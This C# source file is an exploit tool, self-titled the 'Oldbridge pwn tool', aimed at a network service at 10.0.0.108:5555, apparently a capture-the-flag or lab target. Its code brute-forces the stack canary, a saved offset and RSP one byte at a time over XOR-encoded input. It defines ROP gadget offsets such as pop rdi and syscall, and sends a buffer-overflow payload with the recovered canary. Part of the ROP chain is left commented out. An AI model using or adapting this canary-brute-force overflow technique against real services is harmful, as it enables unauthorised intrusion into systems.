using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Net.Sockets;

namespace dSocket
{
    public class Rop
    {
        public const int RAXb = 0x0000000000000b51; // pop rax; ret
        public const int RBPb = 0x0000000000000a90; // pop rbp; ret
        public const int RDIb = 0x0000000000000f73; // pop rdi; ret
        public const int RDXb = 0x0000000000000b53; // pop rdx; ret
        public const int RSIplusb = 0x0000000000000f71; // pop rsi; pop r15; ret
        public const int RSPplusb = 0x0000000000000f6d; // pop rsp; pop r13; pop r14; pop r15; ret
        public const int LeaveRb = 0x0000000000000b6d; // leave ; ret
        public const int Syscallb = 0x0000000000000b55; // syscall ; ret

        public byte[] RAX;
        public byte[] RBP;
        public byte[] RDI;
        public byte[] RDX;
        public byte[] RSIplus;
        public byte[] RSPplus;
        public byte[] LeaveR;
        public byte[] Syscall;

        public List<byte[]> ropChain;

        public Rop(UInt64 offSet)
        {
            ropChain = new List<byte[]>();
            RAX = BitConverter.GetBytes(offSet + Convert.ToUInt64(RAXb));
            RBP = BitConverter.GetBytes(offSet + Convert.ToUInt64(RBPb));
            RDI = BitConverter.GetBytes(offSet + Convert.ToUInt64(RDIb));
            RDX = BitConverter.GetBytes(offSet + Convert.ToUInt64(RDXb));
            RSIplus = BitConverter.GetBytes(offSet + Convert.ToUInt64(RSIplusb));
            RSPplus = BitConverter.GetBytes(offSet + Convert.ToUInt64(RSPplusb));
            LeaveR = BitConverter.GetBytes(offSet + Convert.ToUInt64(LeaveRb));
            Syscall = BitConverter.GetBytes(offSet + Convert.ToUInt64(Syscallb));
        }        

        public void AddToROPChain(byte[] ropGadget)
        {
            // reverse the order of ropGadget
            byte[] reverseROP = new byte[ropGadget.Length];
            for (int j = 0; j < ropGadget.Length; j++)
            {
                reverseROP[j] = ropGadget[ropGadget.Length - 1 - j];
            }

            ropChain.Add(reverseROP);
        }

        public byte[] ROPChainToByteArray()
        {
            byte[] result = new byte[8 * ropChain.Count];
            int i = 0;
            foreach (byte[] bArray in ropChain)
            {
                foreach (byte eachByte in bArray) 
                {
                    result[i] = eachByte;
                    i++;
                }
            }
            return result;
        }        
    }
    class Program
    {                
        private const string Host = "10.0.0.108";
        private const int Port = 5555;
        private static byte[] caNary;       // byte array big endian hex addresses
        private static byte[] offSet;       // byte array big endian hex addresses
        private static byte[] RSP;          // byte array big endian hex addresses
        private static UInt64 ropOffset;
        private static UInt64 stackOffset;

        private static Socket ConnectSocket()
        {
            //IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
            //IPAddress ipAddress = ipHostInfo.AddressList[0];
            IPAddress ipAddress = IPAddress.Parse(Host);
            IPEndPoint ipe = new IPEndPoint(ipAddress, Port);

            Socket mySock = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                mySock.Connect(ipe);
            }
            catch (ArgumentNullException ane)
            {
                Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
            }
            catch (SocketException se)
            {
                Console.WriteLine("SocketException : {0}", se.ToString());
            }
            catch (Exception e)
            {
                Console.WriteLine("Unexpected exception : {0}", e.ToString());
            }
            mySock.ReceiveTimeout = 1000;
            return mySock;
        }
        private static byte[] XorMe(byte[] inputBuffer)
        {
            byte[] returnBuffer = new byte[inputBuffer.Length];
            for (int i = 0; i < inputBuffer.Length; i++)
            {
                returnBuffer[i] = (byte)(inputBuffer[i] ^ 0x0d);
            }
            return returnBuffer;
        }
        private static void GetCanaryAndOffset(byte[] inputBuffer)
        {
            byte[] stubXOR;
            int totalFound = 0;
            byte[] bytes = new byte[1024];
            int skipYet = 0;

            while (totalFound < 24)
            {
                byte[] returnBuffer = new byte[inputBuffer.Length + 1];
                for (int h = 0x00; h <= 0xff; h += 0x01)
                {
                    // add new byte to array                    
                    stubXOR = new byte[] { (byte)(h ^ 0x0d) };
                    List<byte> list1 = new List<byte>(inputBuffer);
                    List<byte> list2 = new List<byte>(XorMe(stubXOR));
                    list1.AddRange(list2);
                    returnBuffer = list1.ToArray();

                    // test new byte
                    Socket testSocket = ConnectSocket();                    
                    int bytesRec = 0;
                    try
                    {
                        bytesRec = testSocket.Receive(bytes);
                    }
                    catch
                    {
                        Console.WriteLine("[!] Receive error!");                            
                    }
                    testSocket.Send(returnBuffer);
                    bytesRec = 0;
                    Array.Clear(bytes, 0, bytes.Length);
                    try
                    {
                        bytesRec = testSocket.Receive(bytes);
                    }                    
                    catch
                    {
                        if (skipYet == 0)
                        {
                            Console.WriteLine("[!] Skipping dead bytes..");
                            skipYet++;
                        }
                        else
                        {
                            continue;
                        }
                    }
                    testSocket.Close();

                    if (bytesRec > 0)
                    {
                        inputBuffer = returnBuffer;
                        totalFound++;
                        if (inputBuffer.Length == 1033)
                        {
                            Console.Write("[+] Success! Canary: ");
                        }
                        else if (inputBuffer.Length == 1041)
                        {
                            Console.Write("\n[+] Success! Offset: ");
                        }
                        else if (inputBuffer.Length == 1049)
                        {
                            Console.Write("[+] Success! RSP: ");
                        }
                        if (inputBuffer.Length > 1032)
                        {
                            Console.Write("{0}", h.ToString("x2"));
                            if (totalFound == 16)
                            {
                                Console.WriteLine("");
                            }
                        }
                        break;
                    }
                }
            }

            // display canary and offset
            RSP = new byte[] { inputBuffer[1055], inputBuffer[1054], inputBuffer[1053], inputBuffer[1052],
                                            inputBuffer[1051], inputBuffer[1050], inputBuffer[1049], inputBuffer[1048] };
            offSet = new byte[] { inputBuffer[1047], inputBuffer[1046], inputBuffer[1045], inputBuffer[1044],
                                            inputBuffer[1043], inputBuffer[1042], inputBuffer[1041], inputBuffer[1040] };
            caNary = new byte[] { inputBuffer[1039], inputBuffer[1038], inputBuffer[1037], inputBuffer[1036],
                                            inputBuffer[1035], inputBuffer[1034], inputBuffer[1033], inputBuffer[1032] };
            offSet = XorMe(offSet);
            caNary = XorMe(caNary);
            RSP = XorMe(RSP);

            string canaryStr = "0x";
            string offsetStr = "0x";
            string RSPStr = "0x";

            for (int j = 0; j < 8; j++)
            {
                canaryStr += caNary[j].ToString("x2");
                offsetStr += offSet[j].ToString("x2");
                RSPStr += RSP[j].ToString("x2");
            }

            Console.WriteLine("\n[-] Offset: {0}\tCanary: {1}\tRSP: {2}", offsetStr, canaryStr, RSPStr);

            UInt64 thing = (UInt64)new System.ComponentModel.UInt64Converter().ConvertFromString(RSPStr);
            UInt64 toSub = 3679;
            ropOffset = thing - toSub;

            UInt64 thing2 = (UInt64)new System.ComponentModel.UInt64Converter().ConvertFromString(offsetStr);
            UInt64 toSub2 = 1144;
            stackOffset = thing2 - toSub2;
        }
        private static byte[] GetPayload()
        {
            byte[] correctUser = new byte[] { 0x64, 0x61, 0x76, 0x69, 0x64, 0x65, 0x0d, 0x78 };
            byte[] bytes = new byte[1024];
            byte[] filler = new byte[1024];
            for (int i = 0; i < filler.Length; i++)
            {
                filler[i] = 0x41;
            }
            byte[] toReturn = new byte[correctUser.Length + filler.Length];
            Buffer.BlockCopy(correctUser, 0, toReturn, 0, correctUser.Length);
            Buffer.BlockCopy(filler, 0, toReturn, correctUser.Length, filler.Length);            

            return toReturn;
        }
        private static byte[] MakeROPChain(Rop myRop, byte[] myPayload)
        {
            // method AddToROPChain(byte[] array) - reverse the order of the bytes, add byte array to myRop.ropChain;
            myRop.AddToROPChain(myRop.RAX);
            myRop.AddToROPChain(myRop.RDI);
            myRop.AddToROPChain(myRop.RDX);

            // method ROPChainToByteArray() - merge the byte arrays to a single byte array
            // myRop.ropChain.ROPChainToByteArray();

            // method MergeWithROPChain(byte[] myPayload) - add rop chain to payload
            byte[] reverseCanary = new byte[caNary.Length];
            for (int j = 0; j < caNary.Length; j++)
            {
                reverseCanary[j] = caNary[caNary.Length - 1 - j];
            }
            List<byte> list1 = new List<byte>(myPayload);            
            List<byte> list2 = new List<byte>(XorMe(reverseCanary));
            //List<byte> list3 = new List<byte>(XorMe(myRop.ROPChainToByteArray()));
            list1.AddRange(list2);
            //list1.AddRange(list3);

            return list1.ToArray();
        }
        private static void _pwn()
        {
            // gratuitous hacker text
            Console.WriteLine("\n--> Welcome to the Oldbridge pwn tool!! <--\n\n[~] Let's rage!!\n[*] Beginning brute force");

            // for receives
            byte[] bytes = new byte[1024];



            // get payload
            byte[] myPayload = GetPayload();
            if (myPayload.Length > 0)
            {
                Console.WriteLine("[+] Inital payload generated");
            }



            // get canary, offset, RSP
            GetCanaryAndOffset(myPayload);
            Console.WriteLine("[+] Canary, offset, and RSP calculated");



            // make rop object, build chain, add to payload
            Rop myRop = new Rop(ropOffset);
            myPayload=MakeROPChain(myRop, myPayload);
            Console.WriteLine("[+] ROP chain generated");



            // connect
            Console.WriteLine("\n\ntime for debugger stuff");
            Console.ReadKey();
            Socket mySocket = ConnectSocket();
            int bytesRec3 = mySocket.Receive(bytes);
            if (bytesRec3 > 0)
            {
                Console.WriteLine("[+] Connected");
            }



            // send it
            mySocket.Send(myPayload);
            Console.Write("[+] Payload sent");



            // profit            
            Array.Clear(bytes, 0, bytes.Length);
            int bytesRec2 = mySocket.Receive(bytes);
            mySocket.Close();
            if (bytesRec2 > 0)
            {
                string replacement = Regex.Replace(Encoding.ASCII.GetString(bytes, 0, bytesRec2), @"\t|\n|\r", "");
                Console.Write(" \"{0}\" - VERIFIED!!\n", replacement);
            }
            else
            {
                Console.WriteLine("");
            }
            Console.WriteLine("[+] Pwnd!!  Hit ENTER to exit.");
            Console.ReadKey();
        }

        private static void Main(string[] args)
        {
            _pwn();
        }
    }
}
